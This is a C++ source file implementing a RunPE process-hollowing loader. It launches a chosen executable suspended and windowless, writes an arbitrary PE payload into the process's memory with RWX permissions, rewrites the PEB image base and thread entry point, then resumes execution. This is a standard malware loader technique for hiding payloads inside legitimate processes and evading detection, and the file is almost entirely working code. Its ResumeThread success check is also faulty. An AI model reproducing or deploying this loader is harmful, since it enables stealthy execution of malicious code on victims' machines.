#include "runpe.h"
#include <stdio.h>

// RunPE32 implementation based on the simpler RunPortableExecutable approach
extern "C" int RunPE32(wchar_t* targetPath, unsigned char* payload, size_t payload_size)
{
	// Validate input parameters
	if (!targetPath || !payload || payload_size < 1024) {
		printf("Invalid arguments\n");
		return 0;
	}

	printf("Target: %ls\n", targetPath);
	printf("Payload size: %llu bytes\n", (unsigned long long)payload_size);

	// Parse the PE headers from the payload
	IMAGE_DOS_HEADER* DOSHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(payload);
	if (DOSHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("Error: Invalid DOS signature\n");
		return 0;
	}

	IMAGE_NT_HEADERS* NtHeader = reinterpret_cast<IMAGE_NT_HEADERS*>(payload + DOSHeader->e_lfanew);
	if (NtHeader->Signature != IMAGE_NT_SIGNATURE) {
		printf("Error: Invalid NT signature\n");
		return 0;
	}

	// Create the target process in suspended state
	PROCESS_INFORMATION PI;
	STARTUPINFOW SI;
	ZeroMemory(&PI, sizeof(PI));
	ZeroMemory(&SI, sizeof(SI));
	SI.cb = sizeof(STARTUPINFOW);

	if (!CreateProcessW(
		targetPath,
		NULL,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | CREATE_NO_WINDOW,
		NULL,
		NULL,
		&SI,
		&PI))
	{
		printf("Error: Could not create process: %lu\n", GetLastError());
		return 0;
	}

	printf("Created process PID: %lu\n", PI.dwProcessId);

	// Get the context of the main thread
	CONTEXT CTX;
	ZeroMemory(&CTX, sizeof(CONTEXT));
	CTX.ContextFlags = CONTEXT_FULL;

	if (!GetThreadContext(PI.hThread, &CTX)) {
		printf("Error: Could not get thread context: %lu\n", GetLastError());
		TerminateProcess(PI.hProcess, 0);
		CloseHandle(PI.hThread);
		CloseHandle(PI.hProcess);
		return 0;
	}

	// Read the PEB address to get the image base
	LPVOID ImageBase = nullptr;
	
	// Get PEB address - different register depending on architecture
	#ifdef _WIN64
		DWORD64 PEB_addr = CTX.Rdx;  // 64-bit uses RDX
		printf("PEB address: 0x%llx\n", PEB_addr);
		
		// Read image base from PEB
		if (!ReadProcessMemory(PI.hProcess, reinterpret_cast<LPCVOID>(PEB_addr + 0x10), &ImageBase, sizeof(LPVOID), NULL)) {
			printf("Error: Could not read PEB: %lu\n", GetLastError());
			TerminateProcess(PI.hProcess, 0);
			CloseHandle(PI.hThread);
			CloseHandle(PI.hProcess);
			return 0;
		}
	#else
		DWORD PEB_addr = CTX.Ebx;  // 32-bit uses EBX
		printf("PEB address: 0x%lx\n", PEB_addr);
		
		// Read image base from PEB
		if (!ReadProcessMemory(PI.hProcess, reinterpret_cast<LPCVOID>(PEB_addr + 8), &ImageBase, sizeof(LPVOID), NULL)) {
			printf("Error: Could not read PEB: %lu\n", GetLastError());
			TerminateProcess(PI.hProcess, 0);
			CloseHandle(PI.hThread);
			CloseHandle(PI.hProcess);
			return 0;
		}
	#endif

	printf("Target image base: %p\n", ImageBase);

	// Allocate memory in the target process for our payload
	void* pImageBase = VirtualAllocEx(
		PI.hProcess,
		reinterpret_cast<LPVOID>(NtHeader->OptionalHeader.ImageBase),
		NtHeader->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!pImageBase) {
		// Try to allocate memory at any available address
		pImageBase = VirtualAllocEx(
			PI.hProcess,
			NULL,
			NtHeader->OptionalHeader.SizeOfImage,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE);

		if (!pImageBase) {
			printf("Error: Could not allocate memory in target process: %lu\n", GetLastError());
			TerminateProcess(PI.hProcess, 0);
			CloseHandle(PI.hThread);
			CloseHandle(PI.hProcess);
			return 0;
		}
	}

	printf("Allocated memory at: %p\n", pImageBase);

	// Write the headers to the target process
	if (!WriteProcessMemory(PI.hProcess, pImageBase, payload, NtHeader->OptionalHeader.SizeOfHeaders, NULL)) {
		printf("Error: Could not write headers to target process: %lu\n", GetLastError());
		TerminateProcess(PI.hProcess, 0);
		CloseHandle(PI.hThread);
		CloseHandle(PI.hProcess);
		return 0;
	}

	// Write each section to the target process
	IMAGE_SECTION_HEADER* SectionHeader = IMAGE_FIRST_SECTION(NtHeader);
	for (int i = 0; i < NtHeader->FileHeader.NumberOfSections; i++) {
		BYTE* sectionDestination = reinterpret_cast<BYTE*>(pImageBase) + SectionHeader[i].VirtualAddress;
		BYTE* sectionSource = reinterpret_cast<BYTE*>(payload + SectionHeader[i].PointerToRawData);
		
		if (!WriteProcessMemory(
			PI.hProcess,
			sectionDestination,
			sectionSource,
			SectionHeader[i].SizeOfRawData,
			NULL))
		{
			printf("Error: Could not write section %d to target process: %lu\n", i, GetLastError());
			TerminateProcess(PI.hProcess, 0);
			CloseHandle(PI.hThread);
			CloseHandle(PI.hProcess);
			return 0;
		}
	}

	// Update the image base in the target's PEB
	#ifdef _WIN64
		// For 64-bit process
		if (!WriteProcessMemory(PI.hProcess, reinterpret_cast<LPVOID>(PEB_addr + 0x10), &pImageBase, sizeof(LPVOID), NULL)) {
			printf("Error: Could not update PEB: %lu\n", GetLastError());
			TerminateProcess(PI.hProcess, 0);
			CloseHandle(PI.hThread);
			CloseHandle(PI.hProcess);
			return 0;
		}
		
		// Set the new entry point in RCX register (64-bit entry point register)
		DWORD64 newEntryPoint = reinterpret_cast<DWORD64>(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
		printf("New entry point: %p\n", (void*)newEntryPoint);
		CTX.Rcx = newEntryPoint;
	#else
		// For 32-bit process
		if (!WriteProcessMemory(PI.hProcess, reinterpret_cast<LPVOID>(PEB_addr + 8), &pImageBase, sizeof(LPVOID), NULL)) {
			printf("Error: Could not update PEB: %lu\n", GetLastError());
			TerminateProcess(PI.hProcess, 0);
			CloseHandle(PI.hThread);
			CloseHandle(PI.hProcess);
			return 0;
		}
		
		// Set the new entry point in EAX register (32-bit entry point register)
		DWORD newEntryPoint = reinterpret_cast<DWORD>(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
		printf("New entry point: %p\n", (void*)newEntryPoint);
		CTX.Eax = newEntryPoint;
	#endif

	// Update the thread context
	if (!SetThreadContext(PI.hThread, &CTX)) {
		printf("Error: Could not set thread context: %lu\n", GetLastError());
		TerminateProcess(PI.hProcess, 0);
		CloseHandle(PI.hThread);
		CloseHandle(PI.hProcess);
		return 0;
	}

	// Resume the thread to start execution
	printf("Resuming thread execution\n");
	if (!ResumeThread(PI.hThread)) {
		printf("Error: Could not resume thread: %lu\n", GetLastError());
		TerminateProcess(PI.hProcess, 0);
		CloseHandle(PI.hThread);
		CloseHandle(PI.hProcess);
		return 0;
	}

	// Clean up handles
	CloseHandle(PI.hThread);
	CloseHandle(PI.hProcess);

	printf("RunPE execution completed successfully\n");
	return 1;
} 